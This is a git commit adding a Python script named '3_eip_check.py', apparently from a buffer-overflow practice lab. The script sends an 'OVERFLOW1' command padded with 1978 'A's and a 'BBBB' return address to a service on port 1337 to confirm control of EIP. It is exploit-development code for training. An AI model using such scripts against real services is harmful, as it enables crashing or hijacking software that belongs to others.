0e8129e45120bbd532f7d0d051804b4e8bb7f497
Nicholas Frischkorn <45154327+NickFrischkorn@users.noreply.github.com>
2020-12-17 11:37:30 -0500

    BufferOverflowPrep Scripts

---
+++ 3_eip_check.py
@@ -0,0 +1,24 @@
+import socket
+
+ip = "10.10.218.170"
+port = 1337
+
+prefix = "OVERFLOW1 "
+offset = 1978
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+    s.connect((ip, port))
+    print("Sending evil buffer...")
+    s.send(buffer + "\r\n")
+    print("Done!")
+except:
+    print("Could not connect.")
